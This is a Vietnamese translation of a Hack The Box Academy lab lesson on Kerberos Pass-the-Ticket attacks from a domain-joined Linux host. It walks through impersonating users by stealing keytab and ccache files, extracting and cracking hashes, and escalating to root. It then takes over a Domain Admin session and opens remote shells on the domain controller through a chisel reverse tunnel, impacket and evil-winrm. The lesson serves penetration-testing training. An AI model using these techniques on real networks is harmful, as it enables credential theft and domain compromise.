# Pass the Ticket (PtT) từ Linux

*(Hack The Box Academy — Section 22/26)*

Mặc dù không phổ biến, các máy Linux vẫn có thể kết nối vào Active Directory để cung cấp khả năng quản lý danh tính tập trung và tích hợp với hệ thống của tổ chức, giúp người dùng có một danh tính duy nhất để xác thực trên cả máy Linux và Windows.

Một máy Linux được join vào Active Directory thường sử dụng Kerberos để xác thực. Giả sử đây là trường hợp đó, và chúng ta đã chiếm được quyền truy cập vào một máy Linux kết nối với Active Directory. Trong trường hợp đó, chúng ta có thể tìm các Kerberos ticket để giả danh (impersonate) người dùng khác và mở rộng quyền truy cập vào mạng.

Một hệ thống Linux có thể được cấu hình theo nhiều cách khác nhau để lưu trữ Kerberos ticket. Chúng ta sẽ thảo luận một vài phương án lưu trữ khác nhau trong phần này.

> **Note:** Một máy Linux không kết nối với Active Directory vẫn có thể sử dụng Kerberos ticket trong script hoặc để xác thực vào mạng. Việc join domain không phải là điều kiện bắt buộc để sử dụng Kerberos ticket từ một máy Linux.

## Kerberos trên Linux

Windows và Linux sử dụng cùng một quy trình để yêu cầu Ticket Granting Ticket (TGT) và Service Ticket (TGS). Tuy nhiên, cách chúng lưu trữ thông tin ticket có thể khác nhau tùy vào bản phân phối Linux và cách triển khai.

Trong hầu hết trường hợp, máy Linux lưu Kerberos ticket dưới dạng **ccache file** trong thư mục `/tmp`. Theo mặc định, đường dẫn tới Kerberos ticket được lưu trong biến môi trường `KRB5CCNAME`. Biến này giúp xác định liệu Kerberos ticket có đang được sử dụng hay không, hoặc liệu vị trí lưu trữ mặc định của ticket đã bị thay đổi. Các ccache file này được bảo vệ bởi quyền đọc/ghi cụ thể, nhưng một người dùng có quyền cao hơn hoặc quyền root có thể dễ dàng truy cập các ticket này.

Một cách sử dụng phổ biến khác của Kerberos trên Linux là **keytab file**. Một `keytab` là một file chứa các cặp Kerberos principal và encrypted key (được dẫn xuất từ mật khẩu Kerberos). Bạn có thể dùng keytab file để xác thực đến các hệ thống từ xa khác nhau bằng Kerberos mà không cần nhập mật khẩu. Tuy nhiên, khi bạn đổi mật khẩu, bạn phải tạo lại toàn bộ các keytab file của mình.

`Keytab` file thường cho phép các script tự động xác thực bằng Kerberos mà không cần tương tác của con người hoặc truy cập vào file chứa mật khẩu dạng plain text. Ví dụ, một script có thể dùng keytab file để truy cập file được lưu trong một thư mục chia sẻ (share) trên Windows.

> **Note:** Bất kỳ máy nào có cài Kerberos client đều có thể tạo keytab file. Các keytab file có thể được tạo trên một máy và sao chép để dùng trên các máy khác vì chúng không bị giới hạn với hệ thống nơi chúng được tạo ban đầu.

## Kịch bản (Scenario)

Để thực hành và hiểu cách chúng ta có thể lợi dụng (abuse) Kerberos từ một hệ thống Linux, chúng ta có một máy (`LINUX01`) được kết nối với Domain Controller. Máy này chỉ có thể truy cập được thông qua `MS01`. Để truy cập máy này qua SSH, chúng ta có thể kết nối tới `MS01` qua RDP và từ đó kết nối đến máy Linux bằng SSH từ command line của Windows. Một cách khác là sử dụng port forward. Nếu bạn chưa biết cách làm, bạn có thể đọc module *Pivoting, Tunneling, and Port Forwarding*.

### Linux auth từ MS01

<img width="1018" height="796" alt="image" src="https://github.com/user-attachments/assets/d6e66247-20ba-4bd4-997c-1b2ea609d133" />


```
C:\Users\david>hostname
MS01

C:\Users\david>ssh david@inlanefreight.htb@172.16.1.15
david@inlanefreight.htb@172.16.1.15's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:22:22 AM UTC

  System load:  0.36              Processes:             224
  Usage of /:   38.1% of 13.70GB  Users logged in:       1
  Memory usage: 31%               IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Oct 11 09:22:05 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$
```

Như một lựa chọn khác, chúng ta đã tạo một port forward để đơn giản hóa việc tương tác với `LINUX01`. Bằng cách kết nối tới cổng TCP/2222 trên `MS01`, chúng ta sẽ có được quyền truy cập vào cổng TCP/22 trên `LINUX01`.

Hãy giả sử chúng ta đang trong một đợt đánh giá (assessment) mới, và công ty cấp cho chúng ta quyền truy cập vào `LINUX01` với người dùng `david@inlanefreight.htb` và mật khẩu `Password2`.

### Linux auth qua port forward

```shellsession
naruto3co@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

 System information as of Tue 11 Oct 2022 09:30:58 AM UTC

 System load:  0.09              Processes:              227
 Usage of /:   38.1% of 13.70GB  Users logged in:        2
 Memory usage: 32%               IPv4 address for ens160: 172.16.1.15
 Swap usage:   0%

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$
```

## Xác định việc tích hợp Linux và Active Directory

Chúng ta có thể xác định xem máy Linux có được join domain hay không bằng cách sử dụng `realm`, một công cụ dùng để quản lý việc đăng ký hệ thống vào domain và thiết lập những người dùng hoặc nhóm domain nào được phép truy cập tài nguyên hệ thống local.

### realm — Kiểm tra xem máy Linux có join domain hay không

```shellsession
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Kết quả của lệnh cho thấy máy này được cấu hình như một Kerberos member. Nó cũng cho chúng ta biết thông tin về tên domain (inlanefreight.htb) và những người dùng/nhóm nào được phép đăng nhập, trong trường hợp này là người dùng David và Julio, cùng với nhóm Linux Admins.

Trong trường hợp `realm` không có sẵn, chúng ta cũng có thể tìm các công cụ khác được dùng để tích hợp Linux với Active Directory như `sssd` hoặc `winbind`. Tìm các dịch vụ này đang chạy trên máy là một cách khác để xác định liệu máy đã join domain hay chưa. Chúng ta có thể đọc bài blog liên quan để biết thêm chi tiết. Hãy tìm các dịch vụ này để xác nhận máy có join domain hay không.

### PS — Kiểm tra xem máy Linux có join domain hay không

```shellsession
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root       2140      1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root       2141   2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root       2142   2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root       2143   2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

## Tìm Kerberos ticket trong Linux

Là attacker, chúng ta luôn tìm kiếm credential. Trên các máy Linux đã join domain, chúng ta muốn tìm Kerberos ticket để mở rộng quyền truy cập. Kerberos ticket có thể được tìm thấy ở nhiều vị trí khác nhau tùy vào cách triển khai Linux hoặc việc admin thay đổi cấu hình mặc định. Hãy cùng khám phá một số cách phổ biến để tìm Kerberos ticket.

### Tìm KeyTab file

Một cách tiếp cận đơn giản là dùng `find` để tìm các file có tên chứa từ `keytab`. Khi một admin tạo một Kerberos ticket để dùng với script, họ thường đặt phần mở rộng là `.keytab`. Dù không bắt buộc, đây là cách các admin thường dùng để gọi tên một keytab file.

#### Dùng Find để tìm file có tên chứa "keytab"

```shellsession
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

...SNIP...

  131610    4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
  262169    4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

> **Note:** Để sử dụng một keytab file, chúng ta phải có quyền đọc và ghi (rw) trên file đó.

Một cách khác để tìm `KeyTab` file là trong các script tự động được cấu hình bằng cronjob hoặc bất kỳ dịch vụ Linux nào khác. Nếu một admin cần chạy một script để tương tác với một dịch vụ Windows sử dụng Kerberos, và nếu keytab file đó không có phần mở rộng `.keytab`, chúng ta có thể tìm tên file phù hợp bên trong script. Hãy xem ví dụ sau:

#### Xác định KeyTab file trong Cronjob

```shellsession
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
#
...SNIP...
#
# m h  dom mon dow   command
*5/ * * * *
/home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

Trong script trên, chúng ta nhận thấy việc sử dụng `kinit`, cho thấy Kerberos đang được dùng. `kinit` cho phép tương tác với Kerberos, và chức năng của nó là yêu cầu TGT của người dùng và lưu ticket này trong cache (ccache file). Chúng ta có thể dùng `kinit` để import một `keytab` vào session của mình và đóng vai (act as) người dùng đó.

Trong ví dụ này, chúng ta đã tìm được một script import một Kerberos ticket (`svc_workstations.kt`) cho người dùng `svc_workstations@INLANEFREIGHT.HTB` trước khi thử kết nối tới một thư mục chia sẻ. Chúng ta sẽ thảo luận sau về cách sử dụng những ticket này để giả danh người dùng.

> **Note:** Như đã thảo luận ở phần Pass the Ticket từ Windows, một computer account cần một ticket để tương tác với môi trường Active Directory. Tương tự, một máy Linux đã join domain cũng cần một ticket. Ticket này được biểu diễn dưới dạng một keytab file, mặc định nằm tại `/etc/krb5.keytab` và chỉ có thể được đọc bởi user root. Nếu chúng ta chiếm được ticket này, chúng ta có thể giả danh computer account `LINUX01$.INLANEFREIGHT.HTB`

## Tìm ccache file

Một credential cache hay ccache file lưu giữ Kerberos credential trong khi chúng còn hợp lệ, và thường là trong suốt thời gian session của người dùng. Sau khi người dùng xác thực vào domain, một ccache file sẽ được tạo ra để lưu thông tin ticket. Đường dẫn tới file này được lưu trong biến môi trường `KRB5CCNAME`. Biến này được các công cụ hỗ trợ xác thực Kerberos sử dụng để tìm dữ liệu Kerberos. Hãy cùng kiểm tra các biến môi trường và xác định vị trí Kerberos credential cache của chúng ta:

### Kiểm tra biến môi trường để tìm ccache file

```shellsession
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Như đã đề cập trước đó, ccache file mặc định nằm ở `/tmp`. Chúng ta có thể tìm những người dùng đang đăng nhập trên máy, và nếu chúng ta chiếm được quyền root hoặc một user có quyền cao, chúng ta có thể giả danh một user bằng ccache file của họ trong khi ticket đó vẫn còn hợp lệ.

### Tìm ccache file trong /tmp

```shellsession
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                                  root
4096 Oct  6 16:38 .
drwxr-xr-x 20 root                                  root
4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb
1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb
1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb
1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

## Lợi dụng (Abusing) KeyTab file

Với vai trò attacker, chúng ta có thể tận dụng một keytab file theo nhiều cách. Điều đầu tiên chúng ta có thể làm là giả danh một người dùng bằng `kinit`. Để sử dụng một keytab file, chúng ta cần biết nó được tạo cho người dùng nào. `klist` là một công cụ khác dùng để tương tác với Kerberos trên Linux. Công cụ này đọc thông tin từ một file `keytab`. Hãy xem điều đó với lệnh sau:

### Liệt kê thông tin KeyTab file

```shellsession
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Ticket này tương ứng với người dùng Carlos. Bây giờ chúng ta có thể giả danh người dùng này bằng `kinit`. Hãy xác nhận ticket nào chúng ta đang dùng bằng `klist`, sau đó import ticket của Carlos vào session bằng `kinit`.

> **Note: `kinit` phân biệt hoa/thường (case-sensitive)**, vì vậy hãy chắc chắn dùng đúng tên principal như hiển thị trong `klist`. Trong trường hợp này, tên user viết thường, còn tên domain viết hoa.

### Giả danh một người dùng bằng KeyTab

```shellsession
david@inlanefreight.htb@linux01:~$ klist

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

Chúng ta có thể thử truy cập thư mục chia sẻ `\\dc01\carlos` để xác nhận quyền truy cập của mình.

### Kết nối đến SMB Share với tư cách Carlos

```shellsession
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

> **Note:** Để giữ lại ticket của session hiện tại, trước khi import keytab, hãy lưu một bản copy của ccache file đang có trong biến môi trường `KRB5CCNAME`.

## KeyTab Extract

Phương pháp thứ hai chúng ta sẽ dùng để lợi dụng Kerberos trên Linux là trích xuất các thông tin bí mật (secret) từ một keytab file. Chúng ta đã có thể giả danh Carlos bằng ticket của account này để đọc một thư mục chia sẻ trong domain, nhưng nếu chúng ta muốn có quyền truy cập vào account của anh ta trên máy Linux, chúng ta sẽ cần mật khẩu của anh ta.

Chúng ta có thể thử crack mật khẩu của account này bằng cách trích xuất các hash từ keytab file. Hãy dùng **KeyTabExtract**, một công cụ để trích xuất thông tin có giá trị từ các file `.keytab` loại 502, loại có thể được dùng để xác thực các máy Linux với Kerberos. Script này sẽ trích xuất các thông tin như realm, Service Principal, Encryption Type, và Hash.

### Trích xuất hash KeyTab bằng KeyTabExtract

```shellsession
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Với hash NTLM, chúng ta có thể thực hiện một cuộc tấn công Pass the Hash. Với hash AES256 hoặc AES128, chúng ta có thể forge ticket của mình bằng Rubeus hoặc thử crack các hash này để lấy mật khẩu dạng plaintext.

> **Note:** Một KeyTab file có thể chứa nhiều loại hash khác nhau và có thể được merge để chứa nhiều credential, thậm chí từ nhiều user khác nhau.

Hash dễ crack nhất là hash NTLM. Chúng ta có thể dùng các công cụ như Hashcat hoặc John the Ripper để crack nó. Tuy nhiên, một cách nhanh để giải mã mật khẩu là dùng các repository online như https://crackstation.net/, chứa hàng tỷ mật khẩu.

<img width="1030" height="408" alt="image" src="https://github.com/user-attachments/assets/b4b9d3fc-4205-46ba-9292-e95c9ba47c57" />


Như thấy trong ảnh (kết quả tra cứu hash), mật khẩu của người dùng Carlos là `Password5`. Chúng ta bây giờ có thể đăng nhập với tư cách Carlos.

### Đăng nhập với tư cách Carlos

```shellsession
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
Password:
carlos@inlanefreight.htb@linux01:~$ klist

Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Lấy thêm hash

Carlos có một cronjob sử dụng một KeyTab file tên `svc_workstations.kt`. Chúng ta có thể lặp lại quy trình, crack mật khẩu, và đăng nhập với tư cách `svc_workstations`.

## Lợi dụng KeyTab ccache

Để lợi dụng một ccache file, tất cả những gì chúng ta cần là quyền đọc trên file đó. Các file này, nằm trong `/tmp`, chỉ có thể đọc được bởi người dùng đã tạo ra chúng, nhưng nếu chúng ta chiếm được quyền root, chúng ta có thể sử dụng chúng.

Sau khi đăng nhập với credential của người dùng `svc_workstations`, chúng ta có thể dùng `sudo -l` và xác nhận rằng user này có thể chạy bất kỳ lệnh nào với quyền root. Chúng ta có thể dùng lệnh `sudo su` để chuyển sang user root.

### Leo quyền (Privilege escalation) lên root

```shellsession
naruto3co@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

svc_workstations@inlanefreight.htb@10.129.204.23's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb:
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/...

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

Với quyền root, chúng ta cần xác định các ticket nào đang có trên máy, thuộc về ai, và thời gian hết hạn của chúng.

### Tìm ccache file

```shellsession
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                                        root
4096 Oct  7 11:35 .
drwxr-xr-x 20 root                                        root
4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb              domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb              domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb              domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb             domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb             domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Có một người dùng (julio@inlanefreight.htb) mà chúng ta chưa chiếm được quyền truy cập. Chúng ta có thể xác nhận các nhóm mà anh ta thuộc về bằng `id`.

### Xác định thành viên nhóm bằng lệnh id

```shellsession
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio là thành viên của nhóm `Domain Admins`. Chúng ta có thể thử giả danh người dùng này và chiếm quyền truy cập vào host Domain Controller `DC01`.

Để sử dụng một ccache file, chúng ta có thể copy ccache file và gán đường dẫn của file đó vào biến `KRB5CCNAME`.

### Import ccache file vào session hiện tại

```shellsession
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist

Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                       DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                         DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings             DHSrn      0  Wed Oct  6 20:38:04 2021
  john                               D          0  Mon Jul 18 13:19:50 2022
  julio                              D          0  Mon Jul 18 13:54:02 2022
  pagefile.sys                       AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                           D          0  Fri Feb 25 16:20:48 2022
  Program Files                      DR         0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                D          0  Mon Jul 18 16:00:35 2022
  ProgramData                        DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                       D          0  Thu Oct  6 14:46:20 2022
  System Volume Information          DHS        0  Wed Jul 13 19:01:52 2022
  tools                              D          0  Thu Sep 22 18:19:04 2022
  Users                              DR         0  Thu Oct  6 11:46:05 2022
  Windows                            D          0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

> **Note:** `klist` hiển thị thông tin ticket. Chúng ta cần lưu ý các giá trị "valid starting" và "expires". Nếu ngày hết hạn đã qua, ticket sẽ không hoạt động. Các `ccache file` là tạm thời. Chúng có thể thay đổi hoặc hết hạn nếu người dùng không còn sử dụng chúng nữa, hoặc trong quá trình đăng nhập/đăng xuất.

## Sử dụng công cụ tấn công Linux với Kerberos

Nhiều công cụ tấn công trên Linux tương tác với Windows và Active Directory đều hỗ trợ xác thực Kerberos. Nếu chúng ta sử dụng chúng từ một máy đã join domain, chúng ta cần đảm bảo biến môi trường `KRB5CCNAME` được set đến ccache file mà chúng ta muốn dùng. Trong trường hợp chúng ta tấn công từ một máy không phải member của domain, ví dụ máy tấn công của chúng ta, chúng ta cần đảm bảo máy đó có thể kết nối tới KDC hoặc Domain Controller, và việc phân giải tên domain (name resolution) đang hoạt động.

Trong kịch bản này, máy tấn công của chúng ta không có kết nối tới `KDC/Domain Controller`, và chúng ta không thể dùng Domain Controller để phân giải tên. Để dùng Kerberos, chúng ta cần proxy traffic của mình qua `MS01` với một công cụ như **Chisel** và **Proxychains**, và chỉnh sửa file `/etc/hosts` để hardcode địa chỉ IP của domain và các máy chúng ta muốn tấn công.

### File hosts đã chỉnh sửa

```shellsession
naruto3co@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight  dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

Chúng ta cần chỉnh sửa file cấu hình proxychains để dùng socks5 và cổng 1080.

### File cấu hình Proxychains

```shellsession
naruto3co@htb[/htb]$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

Chúng ta cần tải và chạy `chisel` trên máy tấn công của mình.

### Tải Chisel về máy tấn công

```shellsession
naruto3co@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
naruto3co@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
naruto3co@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
naruto3co@htb[/htb]$ sudo ./chisel server --reverse

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Kết nối tới `MS01` qua RDP và chạy chisel (nằm trong `C:\Tools`).

### Kết nối tới MS01 với xfreerdp

```shellsession
naruto3co@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### Chạy chisel từ MS01

```cmd
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

> **Note:** IP của client là IP máy tấn công của bạn.

Cuối cùng, chúng ta cần chuyển ccache file của Julio từ `LINUX01` và tạo biến môi trường `KRB5CCNAME` với giá trị tương ứng với đường dẫn của ccache file.

### Thiết lập biến môi trường KRB5CCNAME

```shellsession
naruto3co@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

> **Note:** Nếu bạn chưa quen với các thao tác chuyển file, hãy xem module *File Transfers*.

## Impacket

Để sử dụng Kerberos ticket, chúng ta cần chỉ định tên máy đích của mình (không phải IP) và dùng option `-k`. Nếu chúng ta bị hỏi mật khẩu, chúng ta cũng có thể thêm option `-no-pass`.

### Dùng Impacket với proxychains và xác thực Kerberos

```shellsession
naruto3co@htb[/htb]$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

> **Note:** Nếu bạn đang sử dụng các công cụ Impacket từ một máy Linux đã join domain, hãy lưu ý rằng một số bản triển khai Active Directory trên Linux dùng tiền tố `FILE:` trong biến `KRB5CCNAME`. Nếu đúng vậy, chúng ta chỉ cần chỉnh biến này để chỉ chứa đường dẫn tới ccache file.

## Evil-WinRM

Để dùng **evil-winrm** với Kerberos, chúng ta cần cài package Kerberos dùng cho xác thực mạng. Với một số bản Linux dựa trên Debian (Parrot, Kali, v.v.), package đó tên là `krb5-user`. Trong lúc cài, chúng ta sẽ được hỏi về Kerberos realm. Dùng tên domain: `INLANEFREIGHT.HTB`, và KDC là `DC01`.

### Cài package xác thực Kerberos

```shellsession
naruto3co@htb[/htb]$ sudo apt-get install krb5-user -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done

...SNIP...
```

**Default Kerberos v5 realm:**

<img width="1858" height="397" alt="image" src="https://github.com/user-attachments/assets/0c15668e-458c-413d-a49b-f390b66882ce" />


**Administrative server for your Kerberos realm:**

<img width="1715" height="315" alt="image" src="https://github.com/user-attachments/assets/9ac4d534-39b2-4691-aa0a-af325a1e867a" />


(Kerberos server có thể để trống)

Trong trường hợp package `krb5-user` đã được cài từ trước, chúng ta cần chỉnh file cấu hình `/etc/krb5.conf` để bao gồm các giá trị sau:

### File cấu hình Kerberos cho INLANEFREIGHT.HTB

```shellsession
naruto3co@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

...SNIP...

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...SNIP...
```

Bây giờ chúng ta có thể sử dụng evil-winrm.

### Dùng Evil-WinRM với Kerberos

```shellsession
naruto3co@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

## Khác (Miscellaneous)

